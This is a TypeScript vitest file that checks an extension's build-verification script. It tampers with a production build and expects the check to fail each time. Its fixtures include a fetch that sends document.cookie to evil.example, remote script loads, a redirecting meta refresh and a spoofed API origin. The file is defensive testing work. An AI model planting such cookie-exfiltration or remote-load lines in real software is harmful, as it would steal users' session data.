// scripts/check-dist.mjs against tampered copies of a real prod build, for alterations test/unit/m5-check-dist.test.ts
// does not try: modules under another extension, remote resources however they are written, a page that navigates
// itself, the page-level policy hidden or misplaced, a list of manifest and script alterations the check must fail, and
// the licence and third-party notices every build must carry (LICENSE.md, scripts/notices.mjs).
// The build runs with NODE_ENV removed (vitest sets NODE_ENV=test); scripts/build.mjs pins production mode anyway.
import { spawnSync } from "node:child_process";
import { cpSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, resolve } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";

const EXT = resolve(__dirname, "../..");
const work = mkdtempSync(join(tmpdir(), "sixkey-check-dist-tamper-"));
const prodDir = join(work, "prod");
let n = 0;
const env = () => {
  const e = { ...process.env };
  delete e.NODE_ENV;
  return e;
};

function check(dir: string): { ok: boolean; out: string } {
  const r = spawnSync(process.execPath, ["scripts/check-dist.mjs", "--dist", dir], {
    cwd: EXT,
    env: env(),
    encoding: "utf8",
  });
  return { ok: r.status === 0, out: `${r.stdout}${r.stderr}` };
}
function mutant(alter: (dir: string) => void) {
  const dir = join(work, `m${++n}`);
  cpSync(prodDir, dir, { recursive: true });
  alter(dir);
  try {
    return check(dir);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}
const edit = (dir: string, f: string, fn: (t: string) => string) =>
  writeFileSync(join(dir, f), fn(readFileSync(join(dir, f), "utf8")));
const editJson = (dir: string, f: string, fn: (j: Record<string, unknown>) => void) => {
  const j = JSON.parse(readFileSync(join(dir, f), "utf8"));
  fn(j);
  writeFileSync(join(dir, f), JSON.stringify(j, null, 2));
};
const popupChunk = (dir: string) =>
  `assets/${readdirSync(join(dir, "assets")).find((x) => /^popup-(?!locale)[\w-]+\.js$/.test(x))!}`;

beforeAll(() => {
  const r = spawnSync(process.execPath, ["scripts/build.mjs", "--out", prodDir], {
    cwd: EXT,
    env: env(),
    encoding: "utf8",
  });
  if (r.status !== 0) throw new Error(`prod build failed:\n${r.stdout}\n${r.stderr}`);
  expect(check(prodDir).ok).toBe(true);
}, 240_000);
afterAll(() => rmSync(work, { recursive: true, force: true }));

describe("pages and the files they load", () => {
  const META = `<meta http-equiv="Content-Security-Policy" content="connect-src 'none'">`;
  const cases: [string, (d: string) => void, RegExp][] = [
    [
      "a page loads an .mjs module that calls fetch and names another host",
      (d) => {
        writeFileSync(join(d, "assets/x.mjs"), 'fetch("https://evil.example/c?"+document.cookie);');
        edit(d, "popup/index.html", (t) =>
          t.replace("</head>", '<script type="module" src="../assets/x.mjs"></script></head>'),
        );
      },
      /assets\/x\.mjs: `fetch` appears 1 times[\s\S]*not the API origin: https:\/\/evil\.example/,
    ],
    [
      "a file of a kind no build ships (a WebAssembly module)",
      (d) => writeFileSync(join(d, "assets/x.wasm"), "\0asm"),
      /assets\/x\.wasm: a kind of file a build does not ship/,
    ],
    // not a remote load in an extension page (//host/x.js resolves to chrome-extension://host/x.js, which script-src
    // 'self' blocks), but nothing a build writes
    [
      "a page names a protocol-relative script",
      (d) =>
        edit(d, "popup/index.html", (t) =>
          t.replace("</head>", '<script type="module" src="//evil.example/x.js"></script></head>'),
        ),
      /popup\/index\.html: remote resource: \/\/evil\.example\/x\.js/,
    ],
    [
      "a page loads a remote script through an unquoted attribute",
      (d) =>
        edit(d, "options/index.html", (t) =>
          t.replace("</head>", "<script type=module src=https://evil.example/x.js></script></head>"),
        ),
      /options\/index\.html: remote resource: https:\/\/evil\.example\/x\.js/,
    ],
    // navigation is not governed by connect-src (Phase 0 had the same hole); no page of a build refreshes itself
    [
      "a page navigates itself away with a meta refresh",
      (d) =>
        edit(d, "options/index.html", (t) =>
          t.replace("</head>", '<meta http-equiv="refresh" content="0;url=https://evil.example/?x"></head>'),
        ),
      /options\/index\.html: a meta refresh/,
    ],
    [
      "a page whose own policy is only inside an HTML comment",
      (d) => edit(d, "popup/index.html", (t) => t.replace(META, `<!-- ${META} -->`)),
      /popup\/index\.html: no page-level connect-src 'none'/,
    ],
    [
      "a page whose own policy allows the API origin",
      (d) => edit(d, "offscreen/index.html", (t) => t.replace(META, META.replace("'none'", "https://api.sixkey.app"))),
      /offscreen\/index\.html: no page-level connect-src 'none'/,
    ],
  ];
  for (const [what, alter, msg] of cases) {
    it(what, () => {
      const r = mutant(alter);
      expect(r.ok, r.out).toBe(false);
      expect(r.out).toMatch(msg);
    });
  }

  it("every shipped page carries its own connect-src 'none' before its first script", () => {
    expect(check(prodDir).ok).toBe(true);
    // (the side panel's page: docs/design/notes/SIDEPANEL-NOTES.md)
    const pages = ["popup/index.html", "sidepanel/index.html", "options/index.html", "offscreen/index.html"];
    expect(
      readdirSync(prodDir, { recursive: true })
        .map(String)
        .filter((f) => f.endsWith(".html"))
        .sort(),
    ).toEqual([...pages].sort());
    for (const p of pages) {
      const html = readFileSync(join(prodDir, p), "utf8");
      const at = html.indexOf(META);
      expect(at, p).toBeGreaterThan(-1);
      expect(at, p).toBeLessThan(html.search(/<script\b/i));
    }
  });
});

describe("alterations of the manifest and the scripts", () => {
  const cases: [string, (d: string) => void][] = [
    [
      "a second sw.js-named file elsewhere with a fetch",
      (d) => writeFileSync(join(d, "assets/sw.js"), 'fetch("/v1/keys");'),
    ],
    [
      "a page script that names the dev origin only by its port",
      (d) => edit(d, popupChunk(d), (t) => `${t}\nconst o="http://127.0.0.1:8787";`),
    ],
    [
      "the e2e flavour's clipboard permissions granted up front",
      (d) =>
        editJson(d, "manifest.json", (j) => {
          (j.permissions as string[]).push("clipboardRead", "clipboardWrite");
        }),
    ],
    [
      "incognito split mode",
      (d) =>
        editJson(d, "manifest.json", (j) => {
          j.incognito = "split";
        }),
    ],
    [
      "a key (pinning another ID)",
      (d) =>
        editJson(d, "manifest.json", (j) => {
          j.key = "MIIB";
        }),
    ],
    [
      "an update URL",
      (d) =>
        editJson(d, "manifest.json", (j) => {
          j.update_url = "https://evil.example/u.xml";
        }),
    ],
    [
      "optional permissions that are not a list",
      (d) =>
        editJson(d, "manifest.json", (j) => {
          j.optional_permissions = { 0: "nativeMessaging" };
        }),
    ],
    [
      "a duplicate optional host permission",
      (d) =>
        editJson(d, "manifest.json", (j) => {
          j.optional_host_permissions = ["https://api.sixkey.app/*", "https://api.sixkey.app/*"];
        }),
    ],
    [
      "an optional host permission for every subdomain",
      (d) =>
        editJson(d, "manifest.json", (j) => {
          j.optional_host_permissions = ["https://*.sixkey.app/*"];
        }),
    ],
    [
      "the optional host permission over plain HTTP",
      (d) =>
        editJson(d, "manifest.json", (j) => {
          j.optional_host_permissions = ["http://api.sixkey.app/*"];
        }),
    ],
    [
      "the CSP with the same sources but other spacing",
      (d) =>
        editJson(d, "manifest.json", (j) => {
          const c = j.content_security_policy as { extension_pages: string };
          c.extension_pages = c.extension_pages.replace("; connect-src", ";  connect-src");
        }),
    ],
    [
      "the API origin with a userinfo prefix in a chunk",
      (d) => edit(d, popupChunk(d), (t) => `${t}\nconst u="https://api.sixkey.app@evil.example/";`),
    ],
    ["the API origin over plain HTTP", (d) => edit(d, "sw.js", (t) => `${t}\nconst u="http://api.sixkey.app/";`)],
    ["a WebTransport", (d) => edit(d, popupChunk(d), (t) => `${t}\nnew WebTransport("https://api.sixkey.app/");`)],
    ["an RTCPeerConnection", (d) => edit(d, popupChunk(d), (t) => `${t}\nnew RTCPeerConnection();`)],
  ];
  for (const [what, alter] of cases) {
    it(what, () => {
      const r = mutant(alter);
      expect(r.ok, r.out).toBe(false);
    });
  }
});

describe("the licence and the third-party notices every build carries", () => {
  const preact = (
    JSON.parse(readFileSync(join(EXT, "package.json"), "utf8")) as { dependencies: Record<string, string> }
  ).dependencies.preact;
  const cases: [string, (d: string) => void, RegExp][] = [
    ["no LICENSE.txt", (d) => rmSync(join(d, "LICENSE.txt")), /LICENSE\.txt \(the extension's licence\) missing/],
    [
      "a LICENSE.txt that is not the repository's MPL-2.0 text",
      (d) => edit(d, "LICENSE.txt", (t) => t.replace("Covered Software", "Software")),
      /LICENSE\.txt is not the rules' line and then the repository's LICENSES\/MPL-2\.0\.txt/,
    ],
    [
      // TOTP autofill Stage 3 (AF3-3a): the first line names the rules' licences (the plan's §4.1)
      "a LICENSE.txt without the line on the site rules' licences",
      (d) => edit(d, "LICENSE.txt", (t) => t.slice(t.indexOf("Mozilla Public License Version 2.0"))),
      /LICENSE\.txt is not the rules' line and then the repository's LICENSES\/MPL-2\.0\.txt/,
    ],
    [
      "notices without Apple's notice for the site rules' data",
      (d) => edit(d, "THIRD-PARTY-NOTICES.txt", (t) => t.replaceAll("Copyright 2020 - 2026 Apple Inc.", "")),
      /THIRD-PARTY-NOTICES\.txt lacks the notice of the rules' upstream data apple-shared-credentials/,
    ],
    [
      "no THIRD-PARTY-NOTICES.txt",
      (d) => rmSync(join(d, "THIRD-PARTY-NOTICES.txt")),
      /THIRD-PARTY-NOTICES\.txt \(the third-party notices\) missing/,
    ],
    [
      "notices without the OpenSubtitles notice of @zxcvbn-ts/language-en",
      (d) =>
        edit(d, "THIRD-PARTY-NOTICES.txt", (t) =>
          t.replaceAll("Any redistribution of this package must retain this notice.", ""),
        ),
      /THIRD-PARTY-NOTICES\.txt lacks: Any redistribution of this package must retain this notice\./,
    ],
    // each word list's licence URI and attribution (scripts/notices-data.mjs), taken out one at a time
    [
      "notices without the CC BY 3.0 US URI of the EFF word list",
      (d) =>
        edit(d, "THIRD-PARTY-NOTICES.txt", (t) =>
          t.replaceAll("https://creativecommons.org/licenses/by/3.0/us/legalcode", "https://creativecommons.org/"),
        ),
      /THIRD-PARTY-NOTICES\.txt lacks the licence URI of @zxcvbn-ts\/language-common src\/diceware\.json/,
    ],
    [
      "notices without the EFF word list's attribution",
      (d) =>
        edit(d, "THIRD-PARTY-NOTICES.txt", (t) =>
          t.replaceAll("by the Electronic Frontier Foundation (EFF), used under CC BY 3.0 US", "by the EFF"),
        ),
      /THIRD-PARTY-NOTICES\.txt lacks the attribution of @zxcvbn-ts\/language-common src\/diceware\.json/,
    ],
    [
      "notices without the ODC-By URI of the OpenSubtitles word frequencies",
      (d) =>
        edit(d, "THIRD-PARTY-NOTICES.txt", (t) =>
          t.replaceAll("https://opendatacommons.org/licenses/by/1.0/", "https://opendatacommons.org/"),
        ),
      /THIRD-PARTY-NOTICES\.txt lacks the licence URI of @zxcvbn-ts\/language-en src\/commonWords\.json/,
    ],
    [
      "notices without the OpenSubtitles word frequencies' attribution",
      (d) =>
        edit(d, "THIRD-PARTY-NOTICES.txt", (t) =>
          t.replaceAll("which is made available under the ODC Attribution License.", ""),
        ),
      /THIRD-PARTY-NOTICES\.txt lacks the attribution of @zxcvbn-ts\/language-en src\/commonWords\.json/,
    ],
    [
      "notices that label the EFF word list MIT",
      (d) =>
        edit(d, "THIRD-PARTY-NOTICES.txt", (t) =>
          t.replaceAll("Creative Commons Attribution 3.0 United States (CC BY 3.0 US)", "MIT"),
        ),
      /THIRD-PARTY-NOTICES\.txt lacks: Creative Commons Attribution 3\.0 United States/,
    ],
    [
      "notices without the fonts' licence text",
      (d) => edit(d, "THIRD-PARTY-NOTICES.txt", (t) => t.replaceAll("SIL OPEN FONT LICENSE Version 1.1", "")),
      /THIRD-PARTY-NOTICES\.txt lacks: SIL OPEN FONT LICENSE Version 1\.1/,
    ],
    [
      "notices that leave out a runtime dependency",
      (d) => edit(d, "THIRD-PARTY-NOTICES.txt", (t) => t.replace(`\n  preact ${preact}: `, "\n  ")),
      /THIRD-PARTY-NOTICES\.txt does not list preact/,
    ],
    [
      "a text file anywhere but at the root",
      (d) => writeFileSync(join(d, "assets/LICENSE.txt"), "x"),
      /assets\/LICENSE\.txt: a kind of file a build does not ship/,
    ],
  ];
  for (const [what, alter, msg] of cases) {
    it(what, () => {
      const r = mutant(alter);
      expect(r.ok, r.out).toBe(false);
      expect(r.out).toMatch(msg);
    });
  }

  it("the build's licence is the line on the site rules' and the third parties' licences, then the MPL-2.0 text", () => {
    expect(readFileSync(join(prodDir, "LICENSE.txt"), "utf8")).toBe(
      "The files under rules/ are under AGPL-3.0-or-later and MIT: see rules/LICENSE.txt. The third-party software and " +
        "data listed in THIRD-PARTY-NOTICES.txt keep their own licences. Everything else: the Mozilla Public License " +
        "2.0, below.\n\n" +
        readFileSync(resolve(EXT, "../LICENSES/MPL-2.0.txt"), "utf8"),
    );
  });
});
